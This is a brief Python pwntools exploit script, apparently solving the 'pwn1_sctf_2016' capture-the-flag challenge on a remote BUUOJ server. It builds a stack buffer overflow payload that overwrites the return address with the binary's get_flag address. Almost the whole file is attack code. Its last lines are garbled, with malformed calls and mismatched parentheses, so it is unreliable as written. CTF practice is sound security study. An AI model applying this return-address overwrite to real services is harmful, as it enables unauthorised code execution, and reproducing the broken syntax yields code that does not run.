#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
 
#p = process('../root/pwn1_sctf_2016')
p = remote('node3.buuoj.cn',28298)
e = ELF('pwn1')
 
get_flag = e.symbols['get_flag']
log.success('get_flag_addr => {}'.format((hex(get_flag)))
 
payload = 'I' * 21 + 'A' + p32(get_flag)
 
p.sendlineafterpayload)
print(p.recv_raw))(())
